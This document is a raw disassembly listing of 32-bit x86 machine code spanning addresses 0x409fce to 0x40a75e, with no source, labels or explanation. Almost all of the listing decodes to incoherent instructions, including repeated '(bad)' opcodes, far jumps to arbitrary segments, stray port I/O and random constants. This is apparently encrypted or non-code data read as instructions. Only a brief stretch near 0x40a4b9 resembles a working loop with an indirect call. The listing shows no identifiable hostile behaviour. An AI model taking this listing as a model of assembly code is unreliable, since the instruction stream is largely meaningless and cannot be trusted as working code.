  409fce:	xchg   edi,eax
  409fcf:	mov    al,bl
  409fd1:	push   0x4
  409fd3:	mov    esi,0xfb2b13cd
  409fd8:	sbb    al,0xc2
  409fda:	scas   al,BYTE PTR es:[edi]
  409fdb:	pusha  
  409fdc:	cs sub eax,0xf2463625
  409fe2:	clc    
  409fe3:	or     eax,0xc27bd97e
  409fe8:	(bad)  
  409fe9:	int3   
  409fea:	into   
  409feb:	retf   0xd91f
  409fee:	or     eax,edi
  409ff0:	sbb    esi,DWORD PTR [esi-0xab24887]
  409ff6:	or     ecx,DWORD PTR [edi-0x389790da]
  409ffc:	xor    DWORD PTR ds:0x975594d9,ebp
  40a002:	or     ch,bh
  40a004:	jmp    0xda6b:0xc41a6235
  40a00b:	xor    BYTE PTR [edx],bl
  40a00d:	jg     0x409fea
  40a00f:	addr16 in eax,dx
  40a011:	das    
  40a012:	in     eax,dx
  40a013:	add    BYTE PTR [eax],ch
  40a015:	scas   eax,DWORD PTR es:[edi]
  40a016:	aad    0xd0
  40a018:	inc    ecx
  40a019:	adc    DWORD PTR [ecx],esp
  40a01b:	or     al,BYTE PTR [ebp+0x369b27b0]
  40a021:	cld    
  40a022:	jnp    0x40a051
  40a024:	lahf   
  40a025:	fdiv   DWORD PTR [edx-0x35]
  40a028:	data16 jo 0x40a075
  40a02b:	xor    cl,BYTE PTR [ecx+0x14c8968a]
  40a031:	fcmovnu st,st(2)
  40a033:	ins    DWORD PTR es:[edi],dx
  40a034:	outs   dx,BYTE PTR ds:[esi]
  40a035:	xor    esi,0x2fb615c1
  40a03b:	or     DWORD PTR [edx+0x52],esi
  40a03e:	or     cl,BYTE PTR [esi-0x35]
  40a041:	xchg   esi,eax
  40a042:	fs xor eax,ecx
  40a045:	push   ebx
  40a046:	xchg   ch,ch
  40a048:	aam    0xc5
  40a04a:	call   0xcbb1:0x3d78d24d
  40a051:	test   BYTE PTR [ebp-0x43],ch
  40a054:	or     al,0xa1
  40a056:	jg     0x40a033
  40a058:	(bad)
  40a05b:	js     0x40a02a
  40a05d:	xchg   esi,eax
  40a05e:	xor    al,0xb0
  40a060:	cvtps2pd xmm7,QWORD PTR [ecx]
  40a063:	xor    BYTE PTR [ecx],ch
  40a065:	jno    0x40a039
  40a067:	pop    es
  40a068:	mov    ch,0x0
  40a06a:	ret    0x5afe
  40a06d:	or     DWORD PTR [ecx-0x41],ecx
  40a070:	jne    0x40a07b
  40a072:	(bad)  [edx+0x66383c0]
  40a078:	xor    ebx,DWORD PTR ds:0x7ef6a81f
  40a07e:	cdq    
  40a07f:	xchg   edx,eax
  40a080:	pop    edx
  40a081:	fwait
  40a082:	retf   0x1ba8
  40a085:	inc    edi
  40a086:	push   esi
  40a087:	mov    ebp,0xaf5606ee
  40a08c:	lea    eax,[esi]
  40a08e:	addr16 inc eax
  40a090:	jbe    0x40a043
  40a092:	fwait
  40a093:	push   edi
  40a094:	jp     0x40a05a
  40a096:	or     bh,BYTE PTR [edi]
  40a098:	shl    BYTE PTR [ecx-0x10],0x52
  40a09c:	sub    al,0xc7
  40a09e:	xchg   esp,eax
  40a09f:	imul   ecx,DWORD PTR [edx+0x3285bddf],0x78918c15
  40a0a9:	dec    ecx
  40a0aa:	int3   
  40a0ab:	xchg   DWORD PTR [ebp-0x49],edx
  40a0ae:	mov    dh,0x1c
  40a0b0:	jge    0x40a0ad
  40a0b2:	sahf   
  40a0b3:	scas   eax,DWORD PTR es:[edi]
  40a0b4:	int    0x14
  40a0b6:	pop    esi
  40a0b7:	cdq    
  40a0b8:	(bad)  
  40a0ba:	sbb    dh,ch
  40a0bc:	push   es
  40a0bd:	adc    eax,0x47590244
  40a0c2:	add    DWORD PTR [ebx+0x18],esp
  40a0c5:	dec    edi
  40a0c6:	data16 ins BYTE PTR es:[edi],dx
  40a0c8:	and    ah,dl
  40a0ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0cb:	and    BYTE PTR fs:[edi-0x62a1af2d],cl
  40a0d2:	jecxz  0x40a13b
  40a0d4:	pop    edx
  40a0d5:	sti    
  40a0d6:	mov    esi,eax
  40a0d8:	cld    
  40a0d9:	mov    ds:0x58295383,al
  40a0de:	adc    eax,0x1c2d6ca9
  40a0e3:	out    dx,eax
  40a0e4:	push   0x65adcbc5
  40a0e9:	mov    ch,0x77
  40a0eb:	jb     0x40a094
  40a0ed:	div    bl
  40a0ef:	inc    edi
  40a0f0:	lds    ebp,FWORD PTR gs:[edx+0x7f8348cd]
  40a0f7:	mov    DWORD PTR ds:0xeff6b339,ecx
  40a0fd:	adc    al,0x21
  40a0ff:	ja     0x40a0fa
  40a101:	fcmovnu st,st(6)
  40a103:	pop    ebx
  40a104:	leave  
  40a105:	sbb    BYTE PTR [ebx+0x5],0x21
  40a109:	scas   al,BYTE PTR es:[edi]
  40a10a:	jge    0x40a0a8
  40a10c:	sar    BYTE PTR [ebx+0x4f00b89],1
  40a112:	aad    0x6f
  40a114:	pop    edi
  40a115:	mov    edx,DWORD PTR [esi+edx*4-0x4c]
  40a119:	xchg   ebp,eax
  40a11a:	pop    esp
  40a11b:	sub    edi,DWORD PTR [ecx-0x24c087a0]
  40a121:	add    edi,eax
  40a123:	add    BYTE PTR [edx-0x7985fce7],bh
  40a129:	imul   ebp,DWORD PTR [edx+edx*2+0x4b],0x5492224c
  40a131:	dec    ebx
  40a132:	mov    edi,0x812c1571
  40a137:	xor    esi,esi
  40a139:	inc    eax
  40a13a:	leave  
  40a13b:	dec    edx
  40a13c:	cdq    
  40a13d:	ds out 0x8c,al
  40a140:	adc    ecx,DWORD PTR [ecx]
  40a142:	push   ds
  40a143:	imul   ebx,ecx,0x5b8e1723
  40a149:	adc    eax,0x55e779a0
  40a14e:	push   ss
  40a14f:	jmp    0xc556:0x60f55af5
  40a156:	mov    dh,0xb8
  40a158:	pop    edx
  40a159:	out    dx,al
  40a15a:	fadd   st(5),st
  40a15c:	out    dx,eax
  40a15d:	add    eax,edx
  40a15f:	and    BYTE PTR [edx-0x3ac12970],0xde
  40a166:	xor    eax,esi
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	fnsave [edx-0x18c65d55]
  40a17f:	jle    0x40a1ff
  40a181:	cs jge 0x40a202
  40a184:	jle    0x40a15a
  40a186:	loope  0x40a1da
  40a188:	into   
  40a189:	ffreep st(2)
  40a18b:	add    eax,0xd0eca18
  40a190:	daa    
  40a191:	add    DWORD PTR [edi],esp
  40a193:	pop    ds
  40a194:	dec    BYTE PTR [ecx*4+0x2b470048]
  40a19b:	pop    esp
  40a19c:	lea    esi,[esi]
  40a19e:	(bad)  
  40a1a0:	add    DWORD PTR [ecx-0x49],ebx
  40a1a3:	sub    ecx,0x31
  40a1a6:	mov    bl,0x7a
  40a1a8:	mov    ds:0x247a244a,eax
  40a1ad:	pop    esp
  40a1ae:	les    eax,FWORD PTR [esi+0x40]
  40a1b1:	fdiv   DWORD PTR [edx+0x76e63662]
  40a1b7:	pop    eax
  40a1b8:	push   0x56d481b1
  40a1bd:	pextrw ebp,(bad),0xc5
  40a1bf:	sub    eax,0x182fef24
  40a1c4:	sub    ebp,DWORD PTR [ecx+0x7fbb0deb]
  40a1ca:	js     0x40a1b1
  40a1cc:	or     al,0xd5
  40a1ce:	fisub  WORD PTR [esi]
  40a1d0:	push   esp
  40a1d1:	mov    esi,0xe9fb3329
  40a1d6:	ret    
  40a1d7:	ret    0xdff4
  40a1da:	iret   
  40a1db:	inc    esp
  40a1dc:	xlat   BYTE PTR ds:[ebx]
  40a1dd:	mul    DWORD PTR [edi]
  40a1df:	mov    eax,ds:0x2d3abe40
  40a1e4:	sub    esp,DWORD PTR [esp+ebp*4+0x5bedbc9c]
  40a1eb:	fxam   
  40a1ed:	imul   ebx,DWORD PTR [ebp+0x6b],0x7a
  40a1f1:	mov    al,ds:0x7a3b02c8
  40a1f6:	and    bl,BYTE PTR [ebp+0x3e14e348]
  40a1fc:	stos   BYTE PTR es:[edi],al
  40a1fd:	inc    ebp
  40a1fe:	loope  0x40a21e
  40a200:	inc    esp
  40a201:	mov    cl,0x7e
  40a203:	xor    esi,0xffffffd9
  40a206:	sar    BYTE PTR [edx],1
  40a208:	pusha  
  40a209:	int    0x7b
  40a20b:	pop    ebx
  40a20c:	dec    edi
  40a20d:	dec    eax
  40a20e:	shl    BYTE PTR [ebx+edx*8+0x465f80b4],cl
  40a215:	cli    
  40a216:	lods   eax,DWORD PTR ds:[esi]
  40a217:	das    
  40a218:	int3   
  40a219:	xor    BYTE PTR [ebx],ch
  40a21b:	ffreep st(7)
  40a21d:	nop
  40a21e:	clc    
  40a21f:	inc    esp
  40a220:	mov    DWORD PTR [edx+ecx*8-0x3ceefc07],ecx
  40a227:	mov    eax,ds:0xb6227be
  40a22c:	adc    eax,0xc6d5fab1
  40a231:	(bad)  
  40a232:	loopne 0x40a1f7
  40a234:	push   edi
  40a235:	sub    DWORD PTR [edi-0x80],0xffffffc3
  40a239:	adc    DWORD PTR [ebp+0x73],edi
  40a23c:	lods   al,BYTE PTR ds:[esi]
  40a23d:	sbb    eax,0x34576661
  40a242:	push   ebx
  40a243:	adc    ah,BYTE PTR [esp+eax*4]
  40a246:	or     DWORD PTR [edi-0x15a105d6],eax
  40a24c:	retf   0xf590
  40a24f:	in     eax,dx
  40a250:	xchg   edx,eax
  40a251:	mov    ebp,0xdc1abf41
  40a256:	xchg   esi,eax
  40a257:	xchg   BYTE PTR [eax+0x2dba0b21],ah
  40a25d:	int3   
  40a25e:	mov    bl,0x13
  40a260:	loop   0x40a2e0
  40a262:	xchg   esp,eax
  40a263:	push   ds
  40a264:	retf   
  40a265:	repnz and al,BYTE PTR [eax]
  40a268:	cwde   
  40a269:	in     eax,0x4d
  40a26b:	fdiv   QWORD PTR [esi+0x73507c8a]
  40a271:	adc    al,0xc8
  40a273:	pop    ss
  40a274:	adc    ebx,DWORD PTR [edx-0x32]
  40a277:	and    dh,BYTE PTR [ebx+0x61]
  40a27a:	jge    0x40a27b
  40a27c:	mov    ch,ch
  40a27e:	cmp    al,0xdd
  40a280:	xor    eax,0xebd09a2c
  40a285:	mov    ecx,esp
  40a287:	cmp    bh,ch
  40a289:	adc    bh,BYTE PTR [ebx+ebx*2+0x6f9d673]
  40a290:	or     cl,BYTE PTR [edx+eax*8-0x509efb40]
  40a297:	dec    edx
  40a298:	je     0x40a289
  40a29a:	(bad)  
  40a29c:	jecxz  0x40a27a
  40a29e:	scas   al,BYTE PTR es:[edi]
  40a29f:	and    al,0x30
  40a2a1:	sub    dh,ch
  40a2a3:	cmp    DWORD PTR [edx-0x29],edx
  40a2a6:	fnstcw WORD PTR [edx-0x3d]
  40a2a9:	xchg   DWORD PTR [edx-0x628796af],eax
  40a2af:	(bad)  
  40a2b0:	sub    ecx,DWORD PTR [ecx+0x720c1d72]
  40a2b6:	in     eax,0x65
  40a2b8:	xchg   ecx,eax
  40a2b9:	lods   al,BYTE PTR ds:[esi]
  40a2ba:	ficom  WORD PTR [esp+ebp*1]
  40a2bd:	fld    TBYTE PTR [bp+0x2f]
  40a2c1:	dec    esi
  40a2c2:	mov    ds:0xf8da8bd,eax
  40a2c7:	cmp    esp,DWORD PTR [edi]
  40a2c9:	mov    ecx,0xfc68f2e3
  40a2ce:	repz inc edi
  40a2d0:	bswap  ecx
  40a2d2:	push   edx
  40a2d3:	jmp    0x4aeaef50
  40a2d8:	je     0x40a321
  40a2da:	mov    ebp,0x4a01770a
  40a2df:	scas   eax,DWORD PTR es:[edi]
  40a2e0:	repnz mov bl,0x86
  40a2e3:	pop    es
  40a2e4:	mov    bl,0x42
  40a2e6:	out    0x5d,al
  40a2e8:	mov    ah,0x46
  40a2ea:	out    0x9e,eax
  40a2ec:	jl     0x40a328
  40a2ee:	jbe    0x40a36b
  40a2f0:	dec    esi
  40a2f1:	mov    cl,0x11
  40a2f3:	dec    eax
  40a2f4:	sub    al,0xa5
  40a2f6:	cmp    eax,0x796b5ecf
  40a2fb:	inc    esp
  40a2fc:	enter  0x71a2,0x1e
  40a300:	mov    WORD PTR [ecx-0x444de415],?
  40a306:	sub    al,0xd8
  40a308:	rcr    DWORD PTR [esi-0x485f6e9d],1
  40a30e:	inc    edx
  40a30f:	xchg   edx,eax
  40a310:	cmp    al,0x7
  40a312:	ins    DWORD PTR es:[edi],dx
  40a313:	outs   dx,BYTE PTR ds:[esi]
  40a314:	inc    BYTE PTR [eax]
  40a316:	push   ebp
  40a317:	stos   DWORD PTR es:[edi],eax
  40a318:	test   BYTE PTR [esi-0x35688050],bl
  40a31e:	into   
  40a31f:	or     al,0xc0
  40a321:	or     BYTE PTR [ecx],0xd6
  40a324:	xor    ebx,DWORD PTR [edi]
  40a326:	add    eax,0xfd0d678
  40a32b:	xor    DWORD PTR [esi+0x61],0xc6e43399
  40a332:	aas    
  40a333:	(bad)  
  40a334:	sbb    DWORD PTR [edx+0x7fd1b8e2],ecx
  40a33a:	inc    ebx
  40a33b:	push   ds
  40a33c:	xchg   edi,eax
  40a33d:	adc    DWORD PTR [eax],esp
  40a33f:	imul   esi,DWORD PTR [edx+0x3b],0x5
  40a343:	push   0xa0d6da66
  40a348:	jmp    0xe2b5b865
  40a34d:	dec    esp
  40a34e:	xor    ah,BYTE PTR [edi+ebp*4]
  40a351:	xor    ebx,eax
  40a353:	mov    edi,0x5041cdde
  40a358:	call   FWORD PTR [edi-0x42]
  40a35b:	mov    ah,0x6f
  40a35d:	ret    
  40a35e:	mov    ecx,0xa81a6356
  40a363:	bound  esi,QWORD PTR [ebx+eiz*4+0x17dd8998]
  40a36a:	jmp    0xd2b2:0xc3705f76
  40a371:	mov    esi,0xb7bd2881
  40a376:	or     al,0xa4
  40a378:	fwait
  40a379:	pop    esi
  40a37a:	jge    0x40a3e3
  40a37c:	and    ebp,0xffffffef
  40a37f:	(bad)  
  40a380:	cwde   
  40a381:	and    BYTE PTR [edi-0x5cc03afb],ch
  40a387:	lds    esi,FWORD PTR [edi-0x20]
  40a38a:	mov    cl,0x30
  40a38c:	or     bh,dl
  40a38e:	inc    esp
  40a38f:	imul   ecx,ebp,0x74ba0be0
  40a395:	aas    
  40a396:	imul   esp,esi,0x3a0e5640
  40a39c:	fucomp st(1)
  40a39e:	outs   dx,DWORD PTR ds:[esi]
  40a39f:	or     dh,dh
  40a3a1:	dec    esi
  40a3a2:	xchg   ebp,eax
  40a3a3:	pop    esi
  40a3a4:	ror    BYTE PTR [edi],cl
  40a3a6:	adc    al,0x88
  40a3a8:	fidivr DWORD PTR [ecx]
  40a3aa:	sub    cl,bl
  40a3ac:	dec    esp
  40a3ad:	in     al,0x6b
  40a3af:	test   BYTE PTR [edi],dh
  40a3b1:	inc    esp
  40a3b2:	scas   eax,DWORD PTR es:[edi]
  40a3b3:	iret   
  40a3b4:	rcl    ah,0x8a
  40a3b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3b8:	jae    0x40a411
  40a3ba:	adc    cl,BYTE PTR [ecx]
  40a3bc:	add    edi,0x81d3388e
  40a3c2:	ja     0x40a384
  40a3c4:	rcl    BYTE PTR [ecx+0x17],0xda
  40a3c8:	push   esi
  40a3c9:	int3   
  40a3ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3cb:	adc    al,0x30
  40a3cd:	cmp    DWORD PTR [edi],esp
  40a3cf:	inc    ebx
  40a3d0:	pop    esp
  40a3d1:	jbe    0x40a43b
  40a3d3:	add    BYTE PTR [edx+0x17],bh
  40a3d6:	fld    QWORD PTR [edi-0x71]
  40a3d9:	or     BYTE PTR [esi+0x3e6b6383],dh
  40a3df:	pop    ebp
  40a3e0:	imul   ebp,DWORD PTR [ebp+0x75a51160],0xffffffb8
  40a3e7:	push   ecx
  40a3e8:	jl     0x40a414
  40a3ea:	call   0xa881:0x3cd753b0
  40a3f1:	adc    dl,dh
  40a3f3:	scas   al,BYTE PTR es:[edi]
  40a3f4:	bound  ebx,QWORD PTR [eax+0x65]
  40a3f7:	jg     0x40a424
  40a3f9:	rol    DWORD PTR [eax-0x59],1
  40a3fc:	jl     0x40a3e7
  40a3fe:	sar    dh,1
  40a400:	sbb    al,0x6
  40a402:	jno    0x40a423
  40a404:	retf   
  40a405:	fcomp  DWORD PTR [edi+0x6e671049]
  40a40b:	loopne 0x40a44e
  40a40d:	xor    DWORD PTR gs:[ecx-0x4d2d267f],edx
  40a414:	mov    esp,0x375999a8
  40a419:	push   ss
  40a41a:	les    esp,FWORD PTR [ecx]
  40a41c:	mov    ds:0x9abe3452,eax
  40a421:	mov    ecx,0x2e1374cc
  40a426:	sar    DWORD PTR [edi],1
  40a428:	cld    
  40a429:	pusha  
  40a42a:	lods   eax,DWORD PTR ds:[esi]
  40a42b:	cmovns esp,DWORD PTR ds:0x62e9384
  40a432:	push   ecx
  40a433:	mov    ebx,0x764c104e
  40a438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a439:	push   esp
  40a43a:	fbld   TBYTE PTR [esi+eiz*8]
  40a43d:	jmp    0x96b3:0x9f5773ea
  40a444:	rcl    BYTE PTR [edx],cl
  40a446:	and    dl,ch
  40a448:	js     0x40a3db
  40a44a:	arpl   WORD PTR [edi+0x31],di
  40a44d:	pop    ds
  40a44e:	push   0xffffffee
  40a450:	aad    0x72
  40a452:	sahf   
  40a453:	mul    esi
  40a455:	inc    ebp
  40a456:	sbb    BYTE PTR [edi+0x5a],dl
  40a459:	fwait
  40a45a:	not    BYTE PTR [esi+0x7e039d13]
  40a460:	sbb    esi,DWORD PTR [esi+0x32]
  40a463:	loope  0x40a487
  40a465:	cmp    DWORD PTR [ebx+0x4594aa4b],ebx
  40a46b:	pop    ebp
  40a46c:	xor    eax,0x101cd78c
  40a471:	test   DWORD PTR [esi-0x4d],ebp
  40a474:	(bad)  
  40a476:	dec    edx
  40a477:	dec    ebx
  40a478:	add    al,0xcf
  40a47a:	or     BYTE PTR [edi],bh
  40a47c:	(bad)  
  40a47e:	pop    ebp
  40a47f:	cmp    eax,DWORD PTR [eax]
  40a481:	adc    ebx,ebp
  40a483:	mov    eax,ds:0x34a8b747
  40a488:	jge    0x40a4db
  40a48a:	pop    ebp
  40a48b:	rol    bl,1
  40a48d:	clc    
  40a48e:	shl    BYTE PTR [esi-0x74],cl
  40a491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a492:	xchg   ecx,eax
  40a493:	ficom  WORD PTR [edi+0x25]
  40a496:	sbb    eax,0xec25ffe
  40a49b:	sub    dl,BYTE PTR [ecx-0x68422f36]
  40a4a1:	jge    0x40a43f
  40a4a3:	call   0xd6963044
  40a4a8:	mov    WORD PTR [ebx],ds
  40a4aa:	(bad)  
  40a4ab:	fdiv   DWORD PTR ds:0xb86d1cb4
  40a4b1:	inc    ebp
  40a4b2:	lahf   
  40a4b3:	stc    
  40a4b4:	adc    eax,0x2581c703
  40a4b9:	jno    0x40a4bf
  40a4bb:	inc    ebx
  40a4bc:	add    BYTE PTR [eax],al
  40a4be:	add    BYTE PTR [eax],al
  40a4c0:	add    BYTE PTR [ebx],dh
  40a4c2:	fisttp DWORD PTR [ebx]
  40a4c4:	sbb    eax,0x430471
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x430471,ebx
  40a4d0:	cmp    DWORD PTR ds:0x430471,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42ec3b
  40a4e8:	cmp    DWORD PTR ds:0x430471,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	ss xchg edx,eax
  40a512:	loop   0x40a53c
  40a514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a515:	jmp    0x2ebf23fc
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a513
  40a51e:	cmc    
  40a51f:	scas   al,BYTE PTR es:[edi]
  40a520:	stos   BYTE PTR es:[edi],al
  40a521:	leave  
  40a522:	inc    edi
  40a523:	fsubr  QWORD PTR [ebx-0x439beb6b]
  40a529:	(bad)  
  40a52b:	mov    al,ds:0x4976b903
  40a530:	ret    
  40a531:	push   ebp
  40a532:	and    dh,bh
  40a534:	pop    ss
  40a535:	jno    0x40a501
  40a537:	call   0x3a8a:0xf2458478
  40a53e:	add    ah,ch
  40a540:	test   BYTE PTR [eax+0x3397c203],cl
  40a546:	cmp    al,0x78
  40a548:	xchg   BYTE PTR [eax-0x3e],ah
  40a54b:	(bad)  
  40a54c:	stc    
  40a54d:	sbb    ch,BYTE PTR [ebx+0x1796b0f2]
  40a553:	bound  eax,QWORD PTR [edx+0xb]
  40a556:	sub    esp,eax
  40a558:	sub    esp,DWORD PTR ds:0x49c33c36
  40a55e:	pushf  
  40a55f:	ins    BYTE PTR es:[edi],dx
  40a560:	push   edi
  40a561:	pusha  
  40a562:	xor    al,0xf6
  40a564:	mov    eax,0x1c3d7cc5
  40a569:	test   BYTE PTR [ebx+0x3c],dl
  40a56c:	pop    edi
  40a56d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a56e:	dec    ebx
  40a56f:	jmp    0xefd73208
  40a574:	lods   eax,DWORD PTR ds:[esi]
  40a575:	retf   0xa534
  40a578:	cmp    eax,0x33eebf50
  40a57d:	std    
  40a57e:	inc    ebp
  40a57f:	xorps  xmm1,XMMWORD PTR [edx-0x1c3300b2]
  40a586:	mov    esp,0x7f2e5ae0
  40a58b:	add    ch,dh
  40a58d:	dec    ebx
  40a58e:	adc    ebx,0xc
  40a591:	lods   al,BYTE PTR ds:[esi]
  40a592:	sbb    BYTE PTR [ebx],ah
  40a594:	push   cs
  40a595:	cmp    DWORD PTR [eax+0x3f0dad86],edx
  40a59b:	in     eax,dx
  40a59c:	repz adc eax,0xeaef59de
  40a5a2:	sub    al,0x7c
  40a5a4:	xchg   edi,eax
  40a5a5:	push   0x45
  40a5a7:	mov    bl,0xb7
  40a5a9:	(bad)  
  40a5aa:	pop    edi
  40a5ab:	scas   eax,DWORD PTR es:[edi]
  40a5ac:	sar    DWORD PTR [edi+0x8],0xb9
  40a5b0:	dec    eax
  40a5b1:	in     al,0x88
  40a5b3:	pop    ecx
  40a5b4:	in     al,dx
  40a5b5:	ss in  eax,0xdd
  40a5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5b9:	stos   BYTE PTR es:[edi],al
  40a5ba:	pop    edi
  40a5bb:	clc    
  40a5bc:	jle    0x40a5da
  40a5be:	jp     0x40a628
  40a5c0:	ret    0xfb2c
  40a5c3:	push   0x6a
  40a5c5:	xor    bh,BYTE PTR [ecx+0x314d5a42]
  40a5cb:	jnp    0x40a5f6
  40a5cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5ce:	rcr    DWORD PTR [ebp+ebp*8+0x3c],0xd3
  40a5d3:	mov    ds:0xfe478a38,al
  40a5d8:	cli    
  40a5d9:	ss add eax,ebp
  40a5dc:	out    dx,eax
  40a5dd:	xchg   ebx,eax
  40a5de:	(bad)  
  40a5e0:	in     al,0xc3
  40a5e2:	xchg   edx,eax
  40a5e3:	jmp    0x243:0x55879ac7
  40a5ea:	rcl    ch,0x4f
  40a5ed:	pop    edi
  40a5ee:	dec    edi
  40a5ef:	out    0xd,al
  40a5f1:	dec    eax
  40a5f2:	push   ebx
  40a5f3:	dec    eax
  40a5f4:	xor    eax,0x97714bb1
  40a5f9:	call   0x9213bb4f
  40a5fe:	mov    ebp,0x871da6b4
  40a603:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40a605:	jb     0x40a677
  40a607:	fcmovnu st,st(5)
  40a609:	fidivr WORD PTR [ebp-0x44]
  40a60c:	ins    BYTE PTR es:[edi],dx
  40a60d:	aas    
  40a60e:	jge    0x40a5d4
  40a610:	xchg   edx,eax
  40a611:	cmp    ch,BYTE PTR [ebx]
  40a613:	in     eax,0x10
  40a615:	fwait
  40a616:	icebp  
  40a617:	or     eax,0xaa87dda8
  40a61c:	je     0x40a5a4
  40a61e:	push   edx
  40a61f:	das    
  40a620:	mov    dl,0x6
  40a622:	lahf   
  40a623:	mov    cs,WORD PTR [ecx]
  40a625:	pop    ss
  40a626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a627:	outs   dx,BYTE PTR ds:[esi]
  40a628:	aas    
  40a629:	inc    ebp
  40a62a:	bound  edx,QWORD PTR [edx+0x2e54b7aa]
  40a630:	and    al,0x28
  40a632:	sbb    eax,DWORD PTR [edi+eax*8+0x70197288]
  40a639:	test   eax,0x65bace02
  40a63e:	(bad)  
  40a63f:	xchg   ecx,eax
  40a640:	push   ds
  40a641:	repz inc esp
  40a643:	daa    
  40a644:	cli    
  40a645:	push   0x6f3fa003
  40a64a:	push   esp
  40a64b:	xchg   esi,eax
  40a64c:	add    dh,BYTE PTR [edx+0x74]
  40a64f:	(bad)  
  40a650:	lahf   
  40a651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a652:	test   DWORD PTR [edx+edx*8-0x2c913f7f],0x3274cc42
  40a65d:	lock scas al,BYTE PTR es:[edi]
  40a65f:	sub    BYTE PTR [esi+0x5b],cl
  40a662:	rcr    DWORD PTR [edx-0x59],0xff
  40a666:	push   0xffffffa6
  40a668:	call   0xe66b6857
  40a66d:	dec    edi
  40a66e:	push   edx
  40a66f:	jmp    0x1d9b:0xe9033602
  40a676:	inc    edx
  40a677:	nop
  40a678:	sti    
  40a679:	les    eax,FWORD PTR [edx+0x7e]
  40a67c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a67d:	daa    
  40a67e:	mov    al,0xe6
  40a680:	jo     0x40a6b8
  40a682:	shl    DWORD PTR [eax-0x6b807c0],0x95
  40a689:	repnz mov esp,0x85251af6
  40a68f:	les    eax,FWORD PTR [edx+0x3d]
  40a692:	ret    0xc6c
  40a695:	sub    BYTE PTR [esi],bl
  40a697:	push   eax
  40a698:	xor    BYTE PTR [edx],dl
  40a69a:	push   edx
  40a69b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a69c:	ret    
  40a69d:	push   esi
  40a69e:	lods   al,BYTE PTR ds:[esi]
  40a69f:	(bad)  
  40a6a0:	fcmovu st,st(0)
  40a6a2:	jae    0x40a673
  40a6a4:	mov    esi,0xfee5ec4e
  40a6a9:	dec    ebp
  40a6aa:	cvttps2pi mm5,QWORD PTR [esi]
  40a6ad:	add    eax,0x3baa84f3
  40a6b2:	push   cs
  40a6b3:	sub    DWORD PTR [eax+0x21],ecx
  40a6b6:	xchg   BYTE PTR [edx+0x25],bl
  40a6b9:	pop    es
  40a6ba:	dec    edi
  40a6bb:	cli    
  40a6bc:	add    dh,al
  40a6be:	ja     0x40a708
  40a6c0:	enter  0x385f,0x32
  40a6c4:	inc    eax
  40a6c5:	sub    DWORD PTR [ecx+0x6844b2e7],ecx
  40a6cb:	pop    ss
  40a6cc:	dec    esp
  40a6cd:	push   0x41
  40a6cf:	cwde   
  40a6d0:	stos   DWORD PTR es:[edi],eax
  40a6d1:	inc    ebx
  40a6d2:	lock les esi,FWORD PTR [edi+0x14]
  40a6d6:	or     cl,BYTE PTR [eax]
  40a6d8:	dec    esi
  40a6d9:	sti    
  40a6da:	hlt    
  40a6db:	push   ss
  40a6dc:	xlat   BYTE PTR ds:[ebx]
  40a6dd:	cmp    BYTE PTR [ecx-0x27412c86],bl
  40a6e3:	test   al,0x32
  40a6e5:	cwde   
  40a6e6:	inc    eax
  40a6e7:	in     eax,0xa5
  40a6e9:	jns    0x40a71d
  40a6eb:	xchg   BYTE PTR ds:0xc5a9ce8a,ch
  40a6f1:	inc    ebx
  40a6f2:	mov    dl,0xe2
  40a6f4:	xchg   esi,eax
  40a6f5:	or     al,0x20
  40a6f7:	retf   
  40a6f8:	sub    ebx,DWORD PTR [eax-0x72]
  40a6fb:	dec    eax
  40a6fc:	xchg   edi,eax
  40a6fd:	leave  
  40a6fe:	xor    eax,0xc9f9124e
  40a703:	aad    0xc2
  40a705:	xor    eax,0x240969ae
  40a70a:	xor    BYTE PTR [edi-0x7a4bc8db],cl
  40a710:	inc    eax
  40a711:	jle    0x40a736
  40a713:	ja     0x40a6d1
  40a715:	addr16 dec edx
  40a717:	repnz xchg ebp,eax
  40a719:	test   DWORD PTR [eax],esp
  40a71b:	mov    cl,0x58
  40a71d:	xchg   DWORD PTR ds:0xd23c6371,esp
  40a723:	add    BYTE PTR [esi-0x4afb9730],dh
  40a729:	xchg   esi,eax
  40a72a:	repz xor al,0xe3
  40a72d:	or     bl,ch
  40a72f:	test   al,0x46
  40a731:	pop    es
  40a732:	dec    edx
  40a733:	mov    ebp,0xe6059067
  40a738:	stc    
  40a739:	stc    
  40a73a:	xchg   esi,eax
  40a73b:	rol    ebp,cl
  40a73d:	push   ecx
  40a73e:	mov    ebp,0xe766200e
  40a743:	sbb    eax,0x88c2030b
  40a748:	sbb    ebp,DWORD PTR [edi+0x1d7a738]
  40a74e:	or     eax,0xb2edbdcf
  40a753:	mov    ebx,0x62c22b9
  40a758:	or     al,0xff
  40a75a:	aas    
  40a75b:	xchg   BYTE PTR [ebx+0x38],dh
  40a75e:	mov    ch,0x3b
